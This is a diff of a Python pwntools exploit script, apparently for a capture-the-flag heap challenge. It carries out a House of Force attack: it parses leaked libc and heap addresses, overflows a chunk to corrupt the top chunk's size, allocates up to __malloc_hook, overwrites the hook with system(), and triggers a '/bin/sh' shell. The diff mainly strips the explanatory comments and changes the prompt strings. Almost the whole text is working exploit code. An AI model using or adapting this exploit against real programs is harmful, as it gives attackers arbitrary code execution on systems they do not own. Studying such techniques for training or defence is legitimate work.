@@ -13,54 +13,41 @@ def start():
     else:
         return process(elf.path)
 
-# Select the "malloc" option; send size & data.
 def malloc(size, data):
     io.send("1")
-    io.sendafter("size: ", f"{size}")
-    io.sendafter("data: ", data)
-    io.recvuntil("> ")
+    io.sendafter("malloc size: ", f"{size}")
+    io.sendafter("malloc data: ", data)
+    io.recvuntil("your option is: ")
 
-# Calculate the "wraparound" distance between two addresses.
 def delta(x, y):
     return (0xffffffffffffffff - x) + y
 
 io = start()
 
-# This binary leaks the address of puts(), use it to resolve the libc load address.
 io.recvuntil("puts() @ ")
 libc.address = int(io.recvline(), 16) - libc.sym.puts
 
-# This binary leaks the heap start address.
 io.recvuntil("heap @ ")
 heap = int(io.recvline(), 16)
-io.recvuntil("> ")
+io.recvuntil("your option is: ")
 io.timeout = 0.1
 
-# =============================================================================
 
-# Request a chunk; overflow its user data and overwrite the top chunk's size field with a large value.
-# Write a "/bin/sh" string here if not using the one in libc.
-malloc(24, b"/bin/sh\0" + b"Y"*16 + p64(0xfffffffffffffff1))
 
-# Make a very large request that spans the gap between the top chunk and the malloc hook.
-# Target the malloc hook because the designer can't explicitly call free().
-malloc((libc.sym.__malloc_hook - 0x20) - (heap + 0x20), "Y")
+log.info(f"heap: 0x{heap:02x}")
+log.info(f"target: 0x{elf.sym.target:02x}")
+malloc(24, b"Y"*24 + p64(0xffffffffffffffff))
+# distance = delta(heap+0x20, elf.sym.target-0x20)
 
-# The next chunk to be requested overlaps the malloc hook; overwrite it with the address of system().
+distance = (libc.sym.__malloc_hook - 0x20) - (heap + 0x20)
+malloc(distance, b"/bin/sh")
+
 malloc(24, p64(libc.sym.system))
+cmd = heap + 0x30
+malloc(cmd, 'a')
 
 
-# ---  OPTION 1  ---
-
-# Call malloc() with the address of the string "/bin/sh" in libc as its argument to trigger system("/bin/sh").
-malloc(next(libc.search(b"/bin/sh")), "")
 
 
-# ---  OPTION 2  ---
-
-# Alternatively, call malloc() with the address of a "/bin/sh" string on the heap as its argument.
-#malloc(heap + 0x10, "")
-
-# =============================================================================
-
+log.info(f"delta between heap & main(): 0x{delta(heap, elf.sym.main):02x}")
 io.interactive()
